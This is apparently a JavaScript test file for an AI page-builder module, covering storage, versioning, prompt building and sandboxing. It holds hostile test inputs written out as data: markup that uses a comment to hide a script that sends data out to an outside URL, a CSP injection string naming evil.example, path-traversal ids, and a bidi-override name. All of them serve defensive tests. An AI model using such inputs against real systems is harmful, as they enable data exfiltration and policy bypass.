// My pages (server/pages.js): storage, versions, import and the model's answer,
// with a stand-in model so nothing is sent anywhere.
import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync, readFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { createPages, extractHtml, readExport, buildPrompt, titleOf, localLabel, frameCsp, STARTER } from "./pages.js";

const dir = mkdtempSync(path.join(os.tmpdir(), "aiplay-pages-"));
test.after(() => rmSync(dir, { recursive: true, force: true }));

const asked = [];
const cloud = {
  choices: async () => [{ file: "api:test", label: "Test API · fake" }],
  resolveChoice: async (v) => (v === "api:test" ? { provider: "test", model: "fake" } : null),
  complete: async (choice, prompt) => {
    asked.push(prompt);
    return "Here you go:\n```html\n<!doctype html><html><body><h1>Built</h1></body></html>\n```\nEnjoy.";
  },
};
const pages = createPages({ dir, cloud });

test("a new page starts from the starter and is version 1", async () => {
  const meta = await pages.create({ name: "Song list" });
  assert.match(meta.id, /^[a-f0-9]{12}$/);
  const got = await pages.get(meta.id);
  assert.equal(got.version, 1);
  assert.equal(got.html, STARTER);
  assert.equal((await pages.list())[0].name, "Song list");
});

test("generate asks the chosen model and keeps the answer as a new version", async () => {
  const meta = await pages.create({ name: "Gen" });
  const r = await pages.generate({ id: meta.id, model: "api:test", request: "show a heading" });
  assert.equal(r.version, 2);
  assert.match(r.html, /<h1>Built<\/h1>/);
  assert.match(asked.at(-1), /WHAT THE PERSON WANTS:\nshow a heading/);
  assert.match(asked.at(-1), /studio\.songs\(\)/, "the bridge is described to the model");
  const v1 = await pages.get(meta.id, 1);
  assert.equal(v1.html, STARTER, "the older version is still there");
});

test("generate refuses a model that is not connected, and an empty request", async () => {
  const meta = await pages.create({ name: "X" });
  await assert.rejects(pages.generate({ id: meta.id, model: "api:nope", request: "x" }), /not connected/);
  await assert.rejects(pages.generate({ id: meta.id, model: "api:test", request: "  " }), /Say what/);
});

test("an id that is not ours never reaches the disk", async () => {
  await assert.rejects(pages.get("../../etc"), /No such page/);
  await assert.rejects(pages.get("abc"), /No such page/);
});

test("the model's page is taken from its code block, or from a bare document", () => {
  assert.equal(extractHtml("```html\n<div>a</div>\n```"), "<div>a</div>\n");
  assert.match(extractHtml("Sure! <!doctype html><html><body>x</body></html>"), /^<!doctype html>/);
  assert.equal(extractHtml("I cannot help with that."), null);
});

test("an exported file is checked before it is kept", () => {
  assert.throws(() => readExport({ format: "something", html: "<p>" }), /not an AIPLAY page/);
  assert.throws(() => readExport({ format: "aiplay-page", html: "" }), /no page/);
  const ok = readExport({ format: "aiplay-page", name: "  <b>Mine</b>  ", html: "<p>hi</p>", author: "B", licence: "Apache-2.0" });
  assert.equal(ok.name, "bMine/b");
  assert.equal(ok.licence, "Apache-2.0");
});

test("the prompt carries the current page", () => {
  const p = buildPrompt({ html: "<p>now</p>", request: "more", name: "N" });
  assert.match(p, /```html\n<p>now<\/p>\n```/);
});

test("the model is told what the sandbox blocks and how to get sound through Web Audio", () => {
  const p = buildPrompt({ html: "<p>x</p>", request: "eq", name: "N" });
  assert.match(p, /localStorage, sessionStorage, indexedDB or cookies \(they THROW/);
  assert.match(p, /studio\.audio\(file\) -> Promise<string>/);
  assert.match(p, /Web Audio turns a cross-origin element into SILENCE/);
  assert.match(p, /studio\.get\(key\)/);
});

test("the page's errors travel with the next request", () => {
  const p = buildPrompt({ html: "<p>x</p>", request: "fix", name: "N", errors: ["Uncaught TypeError: a is undefined (line 4)"] });
  assert.match(p, /REPORTS THESE ERRORS[^\n]*\n- Uncaught TypeError: a is undefined \(line 4\)/);
  assert.doesNotMatch(buildPrompt({ html: "", request: "x", name: "N" }), /REPORTS THESE ERRORS/);
});

test("a page keeps its own saved data, capped and per page", async () => {
  const a = await pages.create({ name: "A" }), b = await pages.create({ name: "B" });
  await pages.dataSet(a.id, "eq", { bands: [1, 2, 3] });
  assert.deepEqual(await pages.dataGet(a.id, "eq"), { bands: [1, 2, 3] });
  assert.equal(await pages.dataGet(b.id, "eq"), null, "another page cannot see it");
  await pages.dataSet(a.id, "eq", null);
  assert.equal(await pages.dataGet(a.id, "eq"), null, "null removes it");
  await assert.rejects(pages.dataSet(a.id, "big", "x".repeat(1024 * 1024 + 10)), /1 MB/);
  await assert.rejects(pages.dataSet(a.id, "", 1), /1 to 100/);
});

test("a page on the default name takes the model's <title>; a name the person chose stays", async () => {
  const titled = createPages({ dir, cloud: { ...cloud,
    complete: async () => "```html\n<!doctype html><html><head><title>Song &amp; Equalizer</title></head><body>x</body></html>\n```" } });
  const fresh = await titled.create({});
  assert.equal(fresh.name, "My page");
  const r = await titled.generate({ id: fresh.id, model: "api:test", request: "an eq" });
  assert.equal(r.name, "Song & Equalizer");
  assert.equal((await titled.get(fresh.id)).name, "Song & Equalizer");
  const mine = await titled.create({ name: "Bucky's EQ" });
  assert.equal((await titled.generate({ id: mine.id, model: "api:test", request: "x" })).name, "Bucky's EQ");
  assert.equal(titleOf("<p>no title</p>"), "");
});

test("the engine's own models are offered, write pages through the engine, and wait for a busy card", async () => {
  const sent = [];
  let busy = null;
  const local = {
    models: async () => [{ file: "qwen_3_4b.safetensors", label: "Qwen3 4B - writes lyrics and prompts" },
      { file: "Qwen3-VL-8B-Q6_K.gguf", label: "Qwen3-VL 8B (Q6_K) - writes lyrics and prompts" }, { file: "api:anthropic", label: "x" }],
    complete: async (file, prompt) => { sent.push(file); return "```html\n<!doctype html><html><head><title>Local Page</title></head><body>l</body></html>\n```"; },
    busy: async () => busy,
  };
  const lp = createPages({ dir, cloud, local });
  assert.equal(localLabel({ label: "Qwen3 4B - writes lyrics and prompts" }), "Qwen3 4B · Studio engine · small, more mistakes");
  assert.equal(localLabel({ label: "Qwen3-VL 8B (Q6_K) - writes lyrics and prompts" }), "Qwen3-VL 8B (Q6_K) · Studio engine");
  const meta = await lp.create({});
  busy = "A song is rendering (\"x\").";
  await assert.rejects(lp.generate({ id: meta.id, model: "local:qwen_3_4b.safetensors", request: "x" }), /needs the card/);
  busy = null;
  const r = await lp.generate({ id: meta.id, model: "local:Qwen3-VL-8B-Q6_K.gguf", request: "x" });
  assert.deepEqual(sent, ["Qwen3-VL-8B-Q6_K.gguf"]);
  assert.equal(r.name, "Local Page");
  assert.match((await lp.get(meta.id)).versions.at(-1).source, /^ai:engine\/Qwen3-VL-8B/);
});

/* The security probe of 2026-10-14: a <meta> policy spliced into the page was
 * moved into a comment by hostile markup, and the page then sent the song
 * library out. The rules are headers now, and the page sits in a wrapper. */
const served = async (url) => {
  const out = { status: 0, headers: {}, body: "" };
  const res = {
    writeHead: (s, h) => { out.status = s; Object.assign(out.headers, h); },
    end: (b) => { out.body = String(b ?? ""); },
  };
  const json = (r, s, o) => { out.status = s; out.body = JSON.stringify(o); };
  await pages.handle({ method: "GET", headers: { host: "127.0.0.1:4199" } }, res, new URL(url, "http://127.0.0.1:4199"), { json });
  return out;
};

test("a page is served with its rules as headers, the bridge ahead of any hostile markup", async () => {
  const meta = await pages.create({ name: "Hostile" });
  await pages.handle({ method: "POST", headers: {} }, { writeHead() {}, end() {} }, new URL("http://x/api/pages"), {
    json: () => {}, sameOriginLocalJson: () => true,
    readBody: async () => ({ action: "save", id: meta.id, html: "<!-- <head> --><script>location='http://x/?'+1</script><html><head></head><body>x</body></html>" }),
  });
  const f = await served(`/api/pages/${meta.id}/frame?v=2`);
  const csp = f.headers["Content-Security-Policy"];
  assert.match(csp, /^sandbox allow-scripts;/, "opaque origin even when opened straight in a tab");
  assert.match(csp, /connect-src 'none'/);
  assert.match(csp, /frame-ancestors 'self'/);
  assert.match(f.headers["Content-Type"], /^text\/html/);
  assert.ok(f.body.startsWith('<!doctype html><html><head><meta charset="utf-8"><script>(()=>{'), "Studio's head and bridge come first");
  assert.ok(f.body.indexOf("window.studio") < f.body.indexOf("<!-- <head> -->"));
  assert.match(f.body, /delete window\[k\]/, "WebRTC is taken away before the page runs");
  const s = await served(`/api/pages/${meta.id}/shell?v=2`);
  assert.match(s.headers["Content-Security-Policy"], /frame-src 'self'/, "the wrapper keeps the page's navigations inside Studio");
  assert.doesNotMatch(s.headers["Content-Security-Policy"], /script-src/, "the wrapper runs no script");
  assert.match(s.body, new RegExp(`<iframe id="f"[^>]*sandbox="allow-scripts"[^>]*src="/api/pages/${meta.id}/frame\\?v=2"`));
  assert.equal((await served("/api/pages/..%2F..%2Fetc/frame")).status, 404);
});

test("frameCsp only names a host that looks like one", () => {
  assert.match(frameCsp("127.0.0.1:4199"), /img-src 'self' http:\/\/127\.0\.0\.1:4199 data: blob:/);
  assert.doesNotMatch(frameCsp("evil.example; script-src *"), /evil/);
});

test("names lose direction overrides and line separators", async () => {
  const m = await pages.create({ name: "abc‮dcba x" });
  assert.equal(m.name, "abcdcbax");
});

test("pages live in their own folder with page.json and v<n>.html", async () => {
  const meta = await pages.create({ name: "Files" });
  const j = JSON.parse(readFileSync(path.join(dir, meta.id, "page.json"), "utf8"));
  assert.equal(j.versions[0].n, 1);
  assert.equal(readFileSync(path.join(dir, meta.id, "v1.html"), "utf8"), STARTER);
});
